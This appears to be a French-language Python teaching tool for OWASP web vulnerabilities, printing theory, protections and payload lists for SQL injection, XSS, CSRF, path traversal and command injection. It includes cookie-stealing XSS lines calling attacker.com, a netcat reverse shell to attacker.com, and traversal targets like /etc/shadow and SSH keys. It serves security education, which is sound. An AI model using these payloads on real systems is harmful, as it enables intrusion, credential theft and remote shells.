#!/usr/bin/env python3
"""
🌐 Module Web Hacking Lab
Apprentissage des vulnérabilités web courantes
"""

import os
import sys
import html
import urllib.parse
import hashlib
import base64
import re

class C:
    R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
    B = '\033[94m'; M = '\033[95m'; C = '\033[96m'
    W = '\033[97m'; X = '\033[0m'; BOLD = '\033[1m'

def banner():
    print(f"""
{C.C}{C.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║              🌐 MODULE WEB HACKING LAB                        ║
╠═══════════════════════════════════════════════════════════════╣
║  Apprentissage des vulnérabilités web - OWASP Top 10          ║
╚═══════════════════════════════════════════════════════════════╝
{C.X}
{C.Y}⚠️ Pratiquez sur DVWA, WebGoat, ou vos propres applications !{C.X}
""")

def menu():
    print(f"""
{C.BOLD}═══════════════════════════════════════════════════════════════
                   VULNÉRABILITÉS WEB (OWASP)
═══════════════════════════════════════════════════════════════{C.X}

  {C.C}[1]{C.X}  SQL Injection - Théorie et payloads
  {C.C}[2]{C.X}  XSS (Cross-Site Scripting) - Types et exemples
  {C.C}[3]{C.X}  CSRF (Cross-Site Request Forgery)
  {C.C}[4]{C.X}  Directory Traversal - Path Traversal
  {C.C}[5]{C.X}  Command Injection
  {C.C}[6]{C.X}  File Upload Vulnerabilities
  {C.C}[7]{C.X}  Authentication Bypass
  {C.C}[8]{C.X}  Générateur de Payloads
  {C.C}[9]{C.X}  Encoder/Decoder (URL, Base64, HTML)
  {C.C}[10]{C.X} Lancer un environnement de pratique
  
  {C.R}[0]{C.X}  Retour au menu principal
""")

def sql_injection():
    """Théorie et payloads SQL Injection"""
    info = f"""
{C.C}{C.BOLD}═══ SQL INJECTION ═══{C.X}

{C.Y}Description:{C.X}
L'injection SQL permet d'exécuter des requêtes SQL malveillantes
via des entrées utilisateur non validées.

{C.BOLD}Types d'injection:{C.X}
  • {C.G}In-band SQLi{C.X} - Résultats visibles directement
  • {C.G}Blind SQLi{C.X} - Pas de résultat direct (boolean/time-based)
  • {C.G}Out-of-band SQLi{C.X} - Via canaux alternatifs (DNS, HTTP)

{C.BOLD}Payloads de test classiques:{C.X}
  {C.M}' OR '1'='1{C.X}
  {C.M}' OR '1'='1' --{C.X}
  {C.M}' OR '1'='1' #{C.X}
  {C.M}admin' --{C.X}
  {C.M}1' ORDER BY 1--+{C.X}
  {C.M}1' UNION SELECT NULL--{C.X}

{C.BOLD}Payloads d'extraction:{C.X}
  {C.M}' UNION SELECT username,password FROM users--{C.X}
  {C.M}' UNION SELECT table_name,NULL FROM information_schema.tables--{C.X}
  {C.M}' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--{C.X}

{C.BOLD}Blind SQLi (Boolean):{C.X}
  {C.M}' AND 1=1--{C.X} (true)
  {C.M}' AND 1=2--{C.X} (false)
  {C.M}' AND SUBSTRING(username,1,1)='a'--{C.X}

{C.BOLD}Blind SQLi (Time-based):{C.X}
  {C.M}' AND SLEEP(5)--{C.X}
  {C.M}'; WAITFOR DELAY '0:0:5'--{C.X}

{C.R}Protection:{C.X}
  • Utiliser des requêtes préparées (Prepared Statements)
  • Valider/échapper les entrées utilisateur
  • Principe du moindre privilège pour les comptes DB

{C.G}Outils:{C.X} sqlmap, Burp Suite, SQLninja
"""
    print(info)

def xss_attacks():
    """Types et exemples XSS"""
    info = f"""
{C.C}{C.BOLD}═══ XSS (Cross-Site Scripting) ═══{C.X}

{C.Y}Description:{C.X}
Injection de scripts malveillants dans des pages web vues par d'autres utilisateurs.

{C.BOLD}Types de XSS:{C.X}
  • {C.G}Reflected XSS{C.X} - Via URL, non persistant
  • {C.G}Stored XSS{C.X} - Stocké en base, persistant
  • {C.G}DOM-based XSS{C.X} - Côté client uniquement

{C.BOLD}Payloads de test:{C.X}
  {C.M}<script>alert('XSS')</script>{C.X}
  {C.M}<img src=x onerror=alert('XSS')>{C.X}
  {C.M}<svg onload=alert('XSS')>{C.X}
  {C.M}<body onload=alert('XSS')>{C.X}
  {C.M}"><script>alert('XSS')</script>{C.X}

{C.BOLD}Contournement de filtres:{C.X}
  {C.M}<ScRiPt>alert('XSS')</ScRiPt>{C.X}
  {C.M}<script>alert(String.fromCharCode(88,83,83))</script>{C.X}
  {C.M}<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">{C.X}
  {C.M}javascript:alert('XSS'){C.X}
  {C.M}<svg/onload=alert('XSS')>{C.X}

{C.BOLD}Vol de cookies:{C.X}
  {C.M}<script>document.location='http://attacker.com/steal?c='+document.cookie</script>{C.X}
  {C.M}<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">{C.X}

{C.R}Protection:{C.X}
  • Échapper les sorties HTML (htmlspecialchars)
  • Content Security Policy (CSP)
  • HttpOnly cookies
  • Validation des entrées

{C.G}Outils:{C.X} Burp Suite, XSSer, XSStrike
"""
    print(info)

def csrf_attacks():
    """Théorie CSRF"""
    info = f"""
{C.C}{C.BOLD}═══ CSRF (Cross-Site Request Forgery) ═══{C.X}

{C.Y}Description:{C.X}
Forcer un utilisateur authentifié à exécuter des actions non voulues.

{C.BOLD}Exemple d'attaque:{C.X}
Victime connectée sur sa banque. L'attaquant lui envoie un lien :

  {C.M}<img src="https://bank.com/transfer?to=attacker&amount=1000">{C.X}
  
  {C.M}<form action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
  </form>
  <script>document.forms[0].submit();</script>{C.X}

{C.BOLD}Vérification de vulnérabilité:{C.X}
  1. Identifier les actions sensibles (changement de mot de passe, transfert...)
  2. Vérifier l'absence de token CSRF
  3. Vérifier si les cookies SameSite sont absents

{C.R}Protection:{C.X}
  • Tokens CSRF (synchronizer token pattern)
  • SameSite cookies
  • Vérification du header Referer/Origin
  • Re-authentification pour actions critiques
"""
    print(info)

def directory_traversal():
    """Path Traversal"""
    info = f"""
{C.C}{C.BOLD}═══ DIRECTORY/PATH TRAVERSAL ═══{C.X}

{C.Y}Description:{C.X}
Accès à des fichiers en dehors du répertoire prévu via ../ ou similaire.

{C.BOLD}Payloads de test:{C.X}
  {C.M}../../../etc/passwd{C.X}
  {C.M}..\\..\\..\\windows\\system32\\config\\sam{C.X}
  {C.M}....//....//....//etc/passwd{C.X}
  {C.M}..%252f..%252f..%252fetc/passwd{C.X}
  {C.M}%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd{C.X}

{C.BOLD}Fichiers intéressants (Linux):{C.X}
  /etc/passwd
  /etc/shadow
  /etc/hosts
  /var/log/apache2/access.log
  ~/.ssh/id_rsa
  /proc/self/environ

{C.BOLD}Fichiers intéressants (Windows):{C.X}
  C:\\Windows\\System32\\config\\SAM
  C:\\Windows\\repair\\sam
  C:\\boot.ini
  C:\\inetpub\\wwwroot\\web.config

{C.R}Protection:{C.X}
  • Valider les chemins (whitelist)
  • Utiliser des fonctions de canonicalisation
  • Chroot/jail les applications
"""
    print(info)

def command_injection():
    """Command Injection"""
    info = f"""
{C.C}{C.BOLD}═══ COMMAND INJECTION ═══{C.X}

{C.Y}Description:{C.X}
Exécution de commandes système via des entrées utilisateur non validées.

{C.BOLD}Opérateurs de chaînage:{C.X}
  {C.M}; command{C.X}       - Exécute après
  {C.M}| command{C.X}       - Pipe vers
  {C.M}|| command{C.X}      - Exécute si le premier échoue
  {C.M}&& command{C.X}      - Exécute si le premier réussit
  {C.M}& command{C.X}       - Exécute en background
  {C.M}`command`{C.X}       - Substitution de commande
  {C.M}$(command){C.X}      - Substitution de commande

{C.BOLD}Payloads de test:{C.X}
  {C.M}; whoami{C.X}
  {C.M}| cat /etc/passwd{C.X}
  {C.M}; ping -c 5 attacker.com{C.X}
  {C.M}`sleep 5`{C.X}
  {C.M}$(cat /etc/passwd){C.X}
  {C.M}; nc -e /bin/sh attacker.com 4444{C.X}

{C.BOLD}Contournement (espaces):{C.X}
  {C.M}${{IFS}}{C.X}        - Séparateur
  {C.M}%09{C.X}            - Tab
  {C.M}<{C.X}               - Redirection

{C.R}Protection:{C.X}
  • Ne jamais passer d'entrées utilisateur aux commandes système
  • Si nécessaire, utiliser des whitelists strictes
  • Utiliser des APIs plutôt que des commandes shell
"""
    print(info)

def encoder_decoder():
    """Outil d'encodage/décodage"""
    print(f"\n{C.C}═══ ENCODER/DECODER ═══{C.X}\n")
    
    while True:
        print(f"""
  {C.C}[1]{C.X} URL Encode
  {C.C}[2]{C.X} URL Decode
  {C.C}[3]{C.X} Base64 Encode
  {C.C}[4]{C.X} Base64 Decode
  {C.C}[5]{C.X} HTML Encode
  {C.C}[6]{C.X} HTML Decode
  {C.C}[7]{C.X} MD5 Hash
  {C.C}[8]{C.X} SHA256 Hash
  {C.C}[0]{C.X} Retour
""")
        choice = input(f"{C.Y}Choix : {C.X}").strip()
        
        if choice == '0':
            break
        
        text = input(f"{C.Y}Texte : {C.X}").strip()
        
        if choice == '1':
            result = urllib.parse.quote(text)
        elif choice == '2':
            result = urllib.parse.unquote(text)
        elif choice == '3':
            result = base64.b64encode(text.encode()).decode()
        elif choice == '4':
            result = base64.b64decode(text).decode()
        elif choice == '5':
            result = html.escape(text)
        elif choice == '6':
            result = html.unescape(text)
        elif choice == '7':
            result = hashlib.md5(text.encode()).hexdigest()
        elif choice == '8':
            result = hashlib.sha256(text.encode()).hexdigest()
        else:
            result = "Option invalide"
        
        print(f"\n{C.G}Résultat:{C.X} {result}\n")

def payload_generator():
    """Générateur de payloads"""
    print(f"\n{C.C}═══ GÉNÉRATEUR DE PAYLOADS ═══{C.X}\n")
    
    payloads = {
        "sql": [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "admin'--",
            "1' ORDER BY 1--+",
            "' UNION SELECT NULL--",
            "' AND SLEEP(5)--",
        ],
        "xss": [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "'\"><script>alert('XSS')</script>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
        ],
        "lfi": [
            "../../../etc/passwd",
            "....//....//....//etc/passwd",
            "/etc/passwd%00",
            "..\\..\\..\\windows\\system32\\config\\sam",
        ],
        "cmd": [
            "; whoami",
            "| cat /etc/passwd",
            "`id`",
            "$(whoami)",
            "& ping -c 1 127.0.0.1",
        ]
    }
    
    print(f"  {C.C}[1]{C.X} SQL Injection")
    print(f"  {C.C}[2]{C.X} XSS")
    print(f"  {C.C}[3]{C.X} LFI/Path Traversal")
    print(f"  {C.C}[4]{C.X} Command Injection")
    
    choice = input(f"\n{C.Y}Type de payload : {C.X}").strip()
    
    types = {'1': 'sql', '2': 'xss', '3': 'lfi', '4': 'cmd'}
    
    if choice in types:
        print(f"\n{C.G}Payloads {types[choice].upper()}:{C.X}\n")
        for p in payloads[types[choice]]:
            print(f"  {C.M}{p}{C.X}")

def practice_env():
    """Lancer un environnement de pratique"""
    print(f"""
{C.C}{C.BOLD}═══ ENVIRONNEMENTS DE PRATIQUE ═══{C.X}

{C.Y}Ces environnements sont CONÇUS pour être hackés légalement :{C.X}

{C.BOLD}1. DVWA (Damn Vulnerable Web App) - Docker:{C.X}
   {C.G}docker run -d -p 80:80 vulnerables/web-dvwa{C.X}
   → Accès : http://localhost (admin/password)

{C.BOLD}2. OWASP Juice Shop - Docker:{C.X}
   {C.G}docker run -d -p 3000:3000 bkimminich/juice-shop{C.X}
   → Accès : http://localhost:3000

{C.BOLD}3. WebGoat - Docker:{C.X}
   {C.G}docker run -d -p 8080:8080 webgoat/webgoat{C.X}
   → Accès : http://localhost:8080/WebGoat

{C.BOLD}4. bWAPP:{C.X}
   {C.G}docker run -d -p 80:80 raesene/bwapp{C.X}

{C.BOLD}5. En ligne (pas besoin de Docker):{C.X}
   • https://portswigger.net/web-security
   • https://pentesterlab.com
   • https://tryhackme.com
""")

def main():
    os.system('cls' if os.name == 'nt' else 'clear')
    banner()
    
    while True:
        menu()
        choice = input(f"\n{C.C}Choisissez une option : {C.X}").strip()
        
        if choice == '0':
            break
        elif choice == '1':
            sql_injection()
        elif choice == '2':
            xss_attacks()
        elif choice == '3':
            csrf_attacks()
        elif choice == '4':
            directory_traversal()
        elif choice == '5':
            command_injection()
        elif choice == '6':
            print(f"\n{C.Y}[!] File Upload - Voir OWASP pour les techniques{C.X}")
        elif choice == '7':
            print(f"\n{C.Y}[!] Auth Bypass - Testez les tokens JWT, cookies, sessions{C.X}")
        elif choice == '8':
            payload_generator()
        elif choice == '9':
            encoder_decoder()
        elif choice == '10':
            practice_env()
        else:
            print(f"\n{C.R}[!] Option invalide{C.X}")
        
        input(f"\n{C.Y}Appuyez sur Entrée pour continuer...{C.X}")

if __name__ == "__main__":
    main()
